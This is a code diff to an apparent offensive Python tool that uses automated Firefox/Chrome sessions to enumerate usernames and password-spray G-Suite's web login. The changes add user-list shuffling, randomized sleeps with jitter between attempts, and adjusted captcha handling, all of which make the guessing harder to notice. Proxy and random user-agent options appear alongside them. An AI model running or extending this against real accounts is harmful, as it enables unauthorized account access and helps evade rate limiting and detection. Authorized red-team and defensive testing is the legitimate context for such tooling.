@@ -25,7 +25,7 @@
 G-Suite's DOM based authentication."""
 import requests
 
-from random import randrange
+from random import randrange, shuffle
 from sys import exit
 from time import sleep
 from urllib.parse import urlparse
@@ -167,10 +167,6 @@ class BrowserEngine:
     def click(self, button):
         button.click()
 
-    def select_dropdown(self, element, value):
-        select = Select(element)
-        select.select_by_value(value)
-
     def submit(self, form):
         form.submit()
 
@@ -236,7 +232,7 @@ class FirefoxBrowserEngine(BrowserEngine):
     driver_path = GeckoDriverManager(log_level=0).install()
 
     def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
-        self.set_proxy(proxy)   # this should be at the top to make effect
+        self.set_proxy(proxy)  # this should be at the top to make effect
         self.options = FirefoxOptions()
         # Set preferences
         self.options.set_preference(
@@ -388,13 +384,18 @@ def enum(args, username_list):
     counter = 0
     browser = new_browser(args.driver, args)
 
-    for username in username_list:
+    if args.shuffle:
+        shuffle(username_list)
+    for idx, username in enumerate(username_list):
         # Handle browser resets after every given username attempts
         if counter == args.reset_after:
             browser = reset_browser(
                 browser, args.driver, args
             )  # Reset the browser to deal with latency issues
             counter = 0
+        # Sleep between each user
+        if idx > 0 and args.sleep > 0:
+            wait(args.sleep, args.jitter)
 
         counter += 1
 
@@ -416,6 +417,7 @@ def enum(args, username_list):
                     print("[ERROR] %s" % e)
                     exit(1)
 
+        wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
         # Populate the username field and click 'Next'
         element = elements["username"]
         usernamefield = browser.find_element(element["type"], element["value"])
@@ -436,7 +438,7 @@ def enum(args, username_list):
             print("[ERROR] %s" % e)
             continue
 
-        wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
+        sleep(1)
         # Check if captcha was activated
         element = elements["captcha"]
         element_pwd = elements["password"]
@@ -450,8 +452,8 @@ def enum(args, username_list):
                     % (text_colors.yellow, 60 - captcha_counter, text_colors.reset),
                     end="\r",
                 )
-                sleep(1)
-                captcha_counter += 1
+                sleep(2)
+                captcha_counter += 2
                 need_interaction = (
                     False
                     if browser.find_element(element_pwd["type"], element_pwd["value"])
@@ -497,13 +499,19 @@ def spray(args, username_list, password_list):
 
         print("[*] Spraying password: %s" % password)
 
-        for username in username_list:
+        if args.shuffle:
+            shuffle(username_list)
+        for useridx, username in enumerate(username_list):
 
             if counter >= args.reset_after:
                 browser = reset_browser(
                     browser, args.driver, args
                 )  # Reset the browser to deal with latency issues
                 counter = 0
+
+            # Sleep between each user
+            if useridx > 0 and args.sleep > 0:
+                wait(args.sleep, args.jitter)
 
             print("[*] Current username: %s" % username)
 
@@ -526,6 +534,8 @@ def spray(args, username_list, password_list):
                         exit(1)
                     pass
 
+            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
+
             # Populate the username field and click 'Next'
             element = elements["username"]
             usernamefield = browser.find_element(element["type"], element["value"])
@@ -545,7 +555,7 @@ def spray(args, username_list, password_list):
                 print("[ERROR] %s" % e)
                 continue
 
-            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
+            sleep(1)
 
             # Check if captcha was activated
             element = elements["captcha"]
@@ -560,8 +570,8 @@ def spray(args, username_list, password_list):
                         % (text_colors.yellow, 60 - captcha_counter, text_colors.reset),
                         end="\r",
                     )
-                    sleep(1)
-                    captcha_counter += 1
+                    sleep(2)
+                    captcha_counter += 2
                     need_interaction = (
                         False
                         if browser.find_element(
@@ -720,8 +730,15 @@ if __name__ == "__main__":
         required=False,
     )
     parser.add_argument(
+        "--sleep",
+        type=float,
+        help="Sleep time (in seconds) between each iteration (default: %(default)s)",
+        default=0,
+        required=False,
+    )
+    parser.add_argument(
         "--wait",
-        type=int,
+        type=float,
         help="Time to wait (in seconds) when looking for DOM elements (default: %(default)s)",
         default=3,
         required=False,
@@ -746,6 +763,9 @@ if __name__ == "__main__":
         action="store_true",
         help="Run in headless mode",
         required=False,
+    )
+    parser.add_argument(
+        "-s", "--shuffle", action="store_true", help="Shuffle user list", required=False
     )
     parser.add_argument(
         "--rua", action="store_true", help="Use random user-agent", required=False
@@ -812,7 +832,6 @@ if __name__ == "__main__":
     if args.proxy:
         if args.proxy[0].isdigit():
             args.proxy = "http://" + args.proxy
-
 
     # Print the banner
     banner(args)
